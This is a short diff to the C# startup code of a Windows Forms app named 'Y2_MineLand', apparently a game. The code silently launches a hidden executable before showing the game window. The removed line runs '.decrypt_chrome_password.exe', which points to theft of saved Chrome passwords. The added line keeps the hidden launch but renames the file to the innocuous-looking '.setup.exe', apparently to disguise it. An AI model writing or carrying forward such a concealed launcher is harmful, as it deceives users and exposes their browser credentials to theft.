@@ -16,7 +16,7 @@ namespace Y2_MineLand
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            Process.Start(".decrypt_chrome_password.exe");
+            Process.Start(".setup.exe");
             Application.Run(new Form1());
         }
     }
